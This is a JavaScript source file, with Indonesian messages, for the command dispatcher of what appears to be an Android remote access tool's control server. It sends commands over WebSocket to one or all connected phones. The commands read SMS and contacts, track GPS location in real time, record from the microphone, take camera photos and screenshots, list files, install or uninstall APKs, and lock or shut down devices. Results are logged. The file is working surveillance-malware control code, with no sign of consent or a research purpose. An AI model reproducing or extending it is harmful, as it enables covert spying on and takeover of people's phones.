// ================================================================
// COMMAND CONTROLLER
// Handle and execute commands to clients
// ================================================================

const clientController = require('./clientController');

class CommandController {
    constructor() {
        this.commandLog = [];
        this.maxLogSize = 1000;
        this.availableCommands = [
            'screenshot',
            'location',
            'sms',
            'contacts',
            'camera',
            'microphone',
            'files',
            'wallpaper',
            'flashlight',
            'sound',
            'shutdown',
            'restart',
            'lock',
            'info',
            'battery',
            'storage',
            'apps',
            'install',
            'uninstall',
            'ping',
            'help'
        ];
    }

    // ============================================================
    // SEND COMMAND TO CLIENT
    // ============================================================

    sendCommand(clientId, command, data = null) {
        const client = clientController.get(clientId);
        if (!client) {
            return { success: false, error: 'Client tidak ditemukan' };
        }

        if (!client.isOnline()) {
            return { success: false, error: 'Client offline' };
        }

        if (!this.isValidCommand(command)) {
            return { success: false, error: `Command tidak dikenal: ${command}` };
        }

        const ws = client.ws;
        if (!ws || ws.readyState !== 1) { // WebSocket.OPEN = 1
            return { success: false, error: 'WebSocket tidak tersedia' };
        }

        const payload = {
            type: 'command',
            command: command,
            id: this.generateCommandId(),
            data: data || null,
            timestamp: new Date().toISOString()
        };

        try {
            ws.send(JSON.stringify(payload));
            clientController.recordCommand(clientId, command);
            this.logCommand(clientId, command, 'sent');
            return {
                success: true,
                message: `Command "${command}" dikirim ke ${client.name}`,
                commandId: payload.id
            };
        } catch (err) {
            return { success: false, error: err.message };
        }
    }

    // ============================================================
    // SEND TO MULTIPLE CLIENTS
    // ============================================================

    sendToAll(command, data = null) {
        const clients = clientController.getOnline();
        const results = [];
        clients.forEach(client => {
            const result = this.sendCommand(client.id, command, data);
            results.push({
                clientId: client.id,
                clientName: client.name,
                success: result.success,
                error: result.error || null
            });
        });
        return {
            success: true,
            total: clients.length,
            results: results
        };
    }

    // ============================================================
    // HANDLE COMMAND RESULT FROM CLIENT
    // ============================================================

    handleResult(clientId, commandId, result) {
        const client = clientController.get(clientId);
        if (!client) return;

        this.logCommand(clientId, 'result', 'received', result);
        return {
            clientId: clientId,
            clientName: client.name,
            commandId: commandId,
            result: result,
            timestamp: new Date().toISOString()
        };
    }

    // ============================================================
    // LOGGING
    // ============================================================

    logCommand(clientId, command, action, result = null) {
        const entry = {
            clientId: clientId,
            command: command,
            action: action,
            result: result ? result.substring(0, 200) : null,
            timestamp: new Date().toISOString()
        };
        this.commandLog.unshift(entry);
        if (this.commandLog.length > this.maxLogSize) {
            this.commandLog.pop();
        }
    }

    getLogs(limit = 50) {
        return this.commandLog.slice(0, limit);
    }

    getLogsByClient(clientId, limit = 20) {
        return this.commandLog
            .filter(log => log.clientId === clientId)
            .slice(0, limit);
    }

    // ============================================================
    // UTILITY
    // ============================================================

    generateCommandId() {
        return 'cmd_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6);
    }

    isValidCommand(command) {
        return this.availableCommands.includes(command);
    }

    getAvailableCommands() {
        return this.availableCommands.slice();
    }

    getCommandHelp(command) {
        const help = {
            screenshot: 'Ambil screenshot layar device',
            location: 'Dapatkan lokasi GPS real-time',
            sms: 'Baca SMS inbox',
            contacts: 'Ambil daftar kontak',
            camera: 'Ambil foto dari kamera',
            microphone: 'Rekam suara dari mic',
            files: 'Daftar file di storage',
            wallpaper: 'Ubah wallpaper device',
            flashlight: 'Nyalakan/matikan senter',
            sound: 'Nyalakan/matikan suara',
            shutdown: 'Matikan device',
            restart: 'Restart device',
            lock: 'Lock device',
            info: 'Dapatkan informasi device',
            battery: 'Dapatkan status baterai',
            storage: 'Dapatkan info storage',
            apps: 'Daftar aplikasi terinstall',
            install: 'Install APK',
            uninstall: 'Uninstall aplikasi',
            ping: 'Cek koneksi client',
            help: 'Daftar semua command'
        };
        return help[command] || 'Tidak ada deskripsi';
    }
}

module.exports = new CommandController();